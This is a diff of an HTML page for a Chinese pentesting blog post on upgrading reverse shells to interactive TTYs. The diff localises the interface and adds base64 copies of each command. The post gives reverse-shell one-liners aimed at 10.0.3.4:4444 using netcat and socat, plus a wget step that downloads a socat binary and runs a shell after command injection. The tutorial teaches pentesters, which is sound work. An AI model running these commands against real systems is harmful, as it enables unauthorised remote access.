@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="zh-CN">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
@@ -19,15 +19,15 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/red/pace-theme-minimal.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"lucifer11.xyz","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":false,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="每个pentester都知道使用netcat获得反向shell并看到该ID的输出令人非常满意的冗长的netcat消息时，会感到非常惊奇。而且，如果其他渗透测试者像我一样，他们也知道失去shell时会感到害怕，因为运行了一个错误的命令，该命令挂起并意外打到“Ctrl-C”，以为它会停止它，但会kill整个连接。   除了不能正确处理SIGINT之外，这些“哑” shell还具有其他缺点：">
+    <meta name="description" content="对照 Python PTY、socat 与 stty 的交互式终端配置及信号行为。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="将simpleshell提升为全交互式的TTYshell">
 <meta property="og:url" content="https://lucifer11.xyz/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/index.html">
 <meta property="og:site_name" content="0xfd&#39;s blog">
-<meta property="og:description" content="每个pentester都知道使用netcat获得反向shell并看到该ID的输出令人非常满意的冗长的netcat消息时，会感到非常惊奇。而且，如果其他渗透测试者像我一样，他们也知道失去shell时会感到害怕，因为运行了一个错误的命令，该命令挂起并意外打到“Ctrl-C”，以为它会停止它，但会kill整个连接。   除了不能正确处理SIGINT之外，这些“哑” shell还具有其他缺点：">
-<meta property="og:locale" content="en_US">
+<meta property="og:description" content="对照 Python PTY、socat 与 stty 的交互式终端配置及信号行为。">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/oops_ctrl_c.png">
 <meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/msfvenom_payloads.png">
 <meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/netcat_shell_cmd.png">
@@ -40,11 +40,12 @@
 <meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/netcat_full_tty.png">
 <meta property="og:image" content="https://blog.ropnop.com/content/images/2017/07/tmux_over_netcat-1.png">
 <meta property="article:published_time" content="2020-01-16T08:21:18.000Z">
-<meta property="article:modified_time" content="2020-08-16T17:01:55.685Z">
+<meta property="article:modified_time" content="2020-01-16T08:21:18.000Z">
 <meta property="article:author" content="253">
-<meta property="article:tag" content="linux提权">
-<meta property="article:tag" content="pentest">
-<meta property="article:tag" content="reverse tty shell">
+<meta property="article:tag" content="PTY">
+<meta property="article:tag" content="Shell">
+<meta property="article:tag" content="socat">
+<meta property="article:tag" content="终端">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://blog.ropnop.com/content/images/2017/07/oops_ctrl_c.png">
 
@@ -53,7 +54,7 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://lucifer11.xyz/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/","path":"2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/","title":"将simpleshell提升为全交互式的TTYshell"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://lucifer11.xyz/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/","path":"2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/","title":"将simpleshell提升为全交互式的TTYshell"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
 <title>将simpleshell提升为全交互式的TTYshell | 0xfd's blog</title>
@@ -68,6 +69,7 @@
 <meta name="color-scheme" content="dark">
 <link rel="stylesheet" href="/css/cyberpunk.css">
 <script src="/js/gargantua.js" defer></script>
+<script src="/js/reader.js" defer></script>
 
   <noscript>
     <link rel="stylesheet" href="/css/noscript.css">
@@ -82,7 +84,7 @@
     <div class="column">
       <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    <div class="toggle" aria-label="切换导航栏" role="button">
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
@@ -101,7 +103,7 @@
   </div>
 
   <div class="site-nav-right">
-    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
         <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
@@ -110,9 +112,9 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-知识库"><a href="/knowledge/" rel="section"><i class="fa fa-book fa-fw"></i>知识库</a></li><li class="menu-item menu-item-导读"><a href="/guide/" rel="section"><i class="fa fa-compass fa-fw"></i>导读</a></li><li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-folder-open fa-fw"></i>分类</a></li><li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
       <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
       </li>
   </ul>
@@ -127,7 +129,7 @@
   </span>
   <div class="search-input-container">
     <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
+           placeholder="搜索..." spellcheck="false"
            type="search" class="search-input">
   </div>
   <span class="popup-btn-close" role="button">
@@ -152,10 +154,10 @@
     <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
-          Table of Contents
+          文章目录
         </li>
         <li class="sidebar-nav-overview">
-          Overview
+          站点概览
         </li>
       </ul>
 
@@ -171,25 +173,25 @@
     <img class="site-author-image" itemprop="image" alt="253"
       src="/images/fifteen-katana-zero-katana-zero.gif">
   <p class="site-author-name" itemprop="name">253</p>
-  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+  <div class="site-description" itemprop="description">漏洞分析、利用机制、二进制研究与安全工程</div>
 </div>
 <div class="site-state-wrap animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">214</span>
-          <span class="site-state-item-name">posts</span>
+          <span class="site-state-item-count">83</span>
+          <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">78</span>
-        <span class="site-state-item-name">categories</span></a>
+        <span class="site-state-item-count">65</span>
+        <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">41</span>
-        <span class="site-state-item-name">tags</span></a>
+        <span class="site-state-item-count">312</span>
+        <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
 </div>
@@ -222,7 +224,7 @@
 
         </div>
       </div>
-        <div class="back-to-top animated" role="button" aria-label="Back to top">
+        <div class="back-to-top animated" role="button" aria-label="返回顶部">
           <i class="fa fa-arrow-up"></i>
           <span>0%</span>
         </div>
@@ -232,7 +234,7 @@
     <div class="sidebar-inner sidebar-blogroll">
       <div class="links-of-blogroll animated">
         <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
-          Links
+          链接
         </div>
         <ul class="links-of-blogroll-list">
             <li class="links-of-blogroll-item">
@@ -262,7 +264,7 @@
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lucifer11.xyz/2020/01/16/Upgrading-simple-shells-to-fully-interactive-TTYs/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -272,12 +274,12 @@
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="0xfd's blog">
-      <meta itemprop="description" content="All things about infosec & ctf">
+      <meta itemprop="description" content="漏洞分析、利用机制、二进制研究与安全工程">
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
       <meta itemprop="name" content="将simpleshell提升为全交互式的TTYshell | 0xfd's blog">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="对照 Python PTY、socat 与 stty 的交互式终端配置及信号行为。">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -290,60 +292,50 @@
       <span class="post-meta-item-icon">
         <i class="far fa-calendar"></i>
       </span>
-      <span class="post-meta-item-text">Posted on</span>
+      <span class="post-meta-item-text">发表于</span>
 
-      <time title="Created: 2020-01-16 16:21:18" itemprop="dateCreated datePublished" datetime="2020-01-16T16:21:18+08:00">2020-01-16</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2020-08-17 01:01:55" itemprop="dateModified" datetime="2020-08-17T01:01:55+08:00">2020-08-17</time>
+      <time title="创建时间：2020-01-16 16:21:18" itemprop="dateCreated datePublished" datetime="2020-01-16T16:21:18+08:00">2020-01-16</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
-      <span class="post-meta-item-text">In</span>
+      <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/linux%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">linux提权</span></a>
+          <a href="/categories/%E5%B7%A5%E7%A8%8B%E4%B8%8E%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工程与工具</span></a>
         </span>
-          , 
+          ，
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/linux%E6%8F%90%E6%9D%83/reverse-tty-shell/" itemprop="url" rel="index"><span itemprop="name">reverse tty shell</span></a>
-        </span>
-          , 
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/linux%E6%8F%90%E6%9D%83/reverse-tty-shell/pentest/" itemprop="url" rel="index"><span itemprop="name">pentest</span></a>
+          <a href="/categories/%E5%B7%A5%E7%A8%8B%E4%B8%8E%E5%B7%A5%E5%85%B7/%E4%BA%A4%E4%BA%92%E4%B8%8E%E4%BC%9A%E8%AF%9D/" itemprop="url" rel="index"><span itemprop="name">交互与会话</span></a>
         </span>
     </span>
 
   
-    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
-      <span class="post-meta-item-text">Views: </span>
+      <span class="post-meta-item-text">阅读次数：</span>
       <span id="busuanzi_value_page_pv"></span>
     </span>
     <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="Word count in article">
+    <span class="post-meta-item" title="本文字数">
       <span class="post-meta-item-icon">
         <i class="far fa-file-word"></i>
       </span>
-      <span class="post-meta-item-text">Word count in article: </span>
+      <span class="post-meta-item-text">本文字数：</span>
       <span>1.6k</span>
     </span>
-    <span class="post-meta-item" title="Reading time">
+    <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
-      <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>6 mins.</span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
     </span>
 </div>
 
+            <div class="post-description">对照 Python PTY、socat 与 stty 的交互式终端配置及信号行为。</div>
         </div>
       </header>
 
@@ -354,7 +346,7 @@
         <ul>
 <li>每个pentester都知道使用netcat获得反向shell并看到该ID的输出令人非常满意的冗长的netcat消息时，会感到非常惊奇。而且，如果其他渗透测试者像我一样，他们也知道失去shell时会感到害怕，因为运行了一个错误的命令，该命令挂起并意外打到“Ctrl-C”，以为它会停止它，但会kill整个连接。</li>
 </ul>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/oops_ctrl_c.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/oops_ctrl_c.png"></p>
 <p>除了不能正确处理SIGINT之外，这些“哑” shell还具有其他缺点：</p>
 <span id="more"></span>
 
@@ -374,74 +366,74 @@
 <li><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2Jsb2cvcG9zdC1leHBsb2l0YXRpb24td2l0aG91dC1hLXR0eQ==">Post-Exploitation Without A TTY<i class="fa fa-external-link-alt"></i></span></li>
 </ul>
 <h4 id="生成reverse-Shell"><a href="#生成reverse-Shell" class="headerlink" title="生成reverse Shell"></a>生成reverse Shell</h4><p>每个人都非常熟悉使用netcat获取反向shell的传统方法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.3.4 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="bmMgLWUgL2Jpbi9zaCAxMC4wLjMuNCA0NDQ0Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.3.4 4444</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="bmMgLWx2cCA0NDQ0Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure>
 
 <p>问题是，不是每个服务器都安装了netcat，也不是每个版本的netcat都带有-e选项。</p>
 <p>Pentest Monkey的备忘单很棒</p>
 <p><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NoZWxscy9yZXZlcnNlLXNoZWxsLWNoZWF0LXNoZWV0">Reverse Shell Cheat Sheet<i class="fa fa-external-link-alt"></i></span></p>
 <p>概述了几种不同的方法，但是我最喜欢的技术是使用Metasploit的msfvenom为我生成单行命令。<br>Metasploit在“cmd&#x2F;unix”下有多个payload，可用于生成单线正向或反向shell：</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/msfvenom_payloads.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/msfvenom_payloads.png"></p>
 <p>这些payload中的任何一个都可以与msfvenom一起使用，以列出所需的原始命令（指定LHOST，LPORT或RPORT）。例如，这是一个不需要-e标志的netcat命令：</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/netcat_shell_cmd.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/netcat_shell_cmd.png"></p>
 <p>这是一个Perl oneliner，以防未安装netcat的情况：</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/perl_shell_cmd.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/perl_shell_cmd.png"></p>
 <p>这些都可以通过使用netcat并监听指定的端口（4444）来捕获。</p>
 <h3 id="方法1：Python-pty模块"><a href="#方法1：Python-pty模块" class="headerlink" title="方法1：Python pty模块"></a>方法1：Python pty模块</h3><p>捕获一个笨拙的shell之后，很长一段时间以来一直使用的命令之一就是使用Python生成一个pty。<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3B0eS5odG1s">pty模块<i class="fa fa-external-link-alt"></i></span>产生一个psuedo-terminal，它可以使su之类的命令误认为它们是在适当的终端中执行的。要升级哑shell，只需运行以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="cHl0aG9uIC1jICdpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJwo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p>例如，这将使您运行su（除了为您提供更好的提示之外）</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/python_pty.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/python_pty.png"></p>
 <p>不幸的是，这不能解决上面概述的其他一些问题。SIGINT（Ctrl-C）仍将关闭Netcat，并且没有制表符完成或历史记录。但这是一个快速而又肮脏的解决方法，已为提供了无数次帮助。</p>
 <h3 id="方法2：使用socat"><a href="#方法2：使用socat" class="headerlink" title="方法2：使用socat"></a>方法2：使用socat</h3><p><span class="exturl" data-url="aHR0cDovL3d3dy5kZXN0LXVucmVhY2gub3JnL3NvY2F0L2RvYy9zb2NhdC5odG1s">socat<i class="fa fa-external-link-alt"></i></span>就像类固醇上的netcat一样，是一种非常强大的网络瑞士军刀。Socat可用于通过TCP连接传递完整的TTY。</p>
 <p>如果在受害者服务器上安装了socat，则可以使用它启动reverse shell。还必须抓住与socat的连接才能获得全部功能。</p>
 <p>以下命令将产生完全交互式的TTY reverse shell：</p>
 <p>On Kali (listen):</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="c29jYXQgZmlsZTpgdHR5YCxyYXcsZWNobz0wIHRjcC1saXN0ZW46NDQ0NAo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>
 
 <p>On Victim (launch):</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="c29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDoxMC4wLjMuNDo0NDQ0Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
 
 <p>如果未安装socat，那么您的运气还不错。有一些独立的二进制文件可以从这个很棒的Github存储库中下载：</p>
 <p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FuZHJldy1kL3N0YXRpYy1iaW5hcmllcw==">https://github.com/andrew-d/static-binaries<i class="fa fa-external-link-alt"></i></span></p>
 <p>使用命令注入漏洞，可以将正确的体系结构socat二进制文件下载到可写的Directoy，对其进行chmod，然后在一行中执行reverse shell：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; <span class="built_in">chmod</span> +x /tmp/socat; /tmp/socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="d2dldCAtcSBodHRwczovL2dpdGh1Yi5jb20vYW5kcmV3LWQvc3RhdGljLWJpbmFyaWVzL3Jhdy9tYXN0ZXIvYmluYXJpZXMvbGludXgveDg2XzY0L3NvY2F0IC1PIC90bXAvc29jYXQ7IGNobW9kICt4IC90bXAvc29jYXQ7IC90bXAvc29jYXQgZXhlYzonYmFzaCAtbGknLHB0eSxzdGRlcnIsc2V0c2lkLHNpZ2ludCxzYW5lIHRjcDoxMC4wLjMuNDo0NDQ0Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; <span class="built_in">chmod</span> +x /tmp/socat; /tmp/socat <span class="built_in">exec</span>:<span class="string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</span><br></pre></td></tr></table></figure>
 
 <p>在Kali上，您将获得一个完全交互式的TTY会话。它支持制表符补全，SIGINT&#x2F;SIGSTP支持,vim,向上箭头历史记录等。它是一个完整的终端。很甜.</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/socat_tty.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/socat_tty.png"></p>
 <h3 id="方法3：使用magic从netcat升级"><a href="#方法3：使用magic从netcat升级" class="headerlink" title="方法3：使用magic从netcat升级"></a>方法3：使用magic从netcat升级</h3><p>我看到菲尼亚斯·费舍尔（Phineas Fisher）在他的黑客视频中使用了这种技术，感觉就像魔术一样。基本上，可以通过在您的Kali终端中设置一些stty选项来使用哑的netcat shell升级到完整的TTY。首先，遵循与方法1中相同的技术，并使用Python生成PTY。一旦bash在PTY中运行，请使用Ctrl-Z后台shell</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/background_netcat.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/background_netcat.png"></p>
 <p>当shell处于后台时，现在检查当前的终端和STTY信息，以便可以强制连接的shell匹配它：</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/term_stty_info.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/term_stty_info.png"></p>
 <p>所需的信息是TERM类型（“ xterm-256color”）和当前TTY的大小（“行38；列116”）在shell仍然处于背景中的情况下，现在将当前的STTY设置为raw类型，并使用以下命令告诉它回显输入的字符：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="c3R0eSByYXcgLWVjaG8K"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span></span><br></pre></td></tr></table></figure>
 
 <p>具有原始风格，输入&#x2F;输出看起来很奇怪，您不会看到下一个命令，但是当您键入它们时，它们正在被处理。接下来用fg前置shell。它将重新打开reverse shell，但是格式将关闭。最后，使用重置重新初始化终端。</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/fg_reset.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/fg_reset.png"></p>
 <p>注意：我没有再次键入nc命令（如上图所示）。我实际上输入了fg，但是没有回显。nc命令是现在处于前台的作业。然后将reset命令输入到netcat shell中</p>
 <p>重置后，shell应再次看起来正常。最后一步是设置shell，终端类型和样式大小以匹配当前的Kali窗口（来自上面收集的信息）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SHELL=bash</span><br><span class="line"><span class="built_in">export</span> TERM=xterm256-color</span><br><span class="line"><span class="built_in">stty</span> rows 38 columns 116</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="ZXhwb3J0IFNIRUxMPWJhc2gKZXhwb3J0IFRFUk09eHRlcm0yNTYtY29sb3IKc3R0eSByb3dzIDM4IGNvbHVtbnMgMTE2Cg=="><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> SHELL=bash</span><br><span class="line"><span class="built_in">export</span> TERM=xterm256-color</span><br><span class="line"><span class="built_in">stty</span> rows 38 columns 116</span><br></pre></td></tr></table></figure>
 
 <p>最终结果是一个完全交互式的TTY，它通过netcat连接具有我们期望的所有功能（选项卡完成，历史记录，作业控制等）：</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/netcat_full_tty.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/netcat_full_tty.png"></p>
 <p>现在的可能性是无止境的。在netcat shell上的Tmux？为什么不？：D</p>
-<p><img src="https://blog.ropnop.com/content/images/2017/07/tmux_over_netcat-1.png"></p>
+<p><img loading="lazy" decoding="async" src="https://blog.ropnop.com/content/images/2017/07/tmux_over_netcat-1.png"></p>
 <h3 id="tl-dr速查表"><a href="#tl-dr速查表" class="headerlink" title="tl; dr速查表"></a>tl; dr速查表</h3><p>备忘单命令：</p>
 <ul>
 <li>使用Python作为伪终端</li>
 </ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash" data-code="cHl0aG9uIC1jICdpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJwo="><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>使用socat</li>
 </ul>
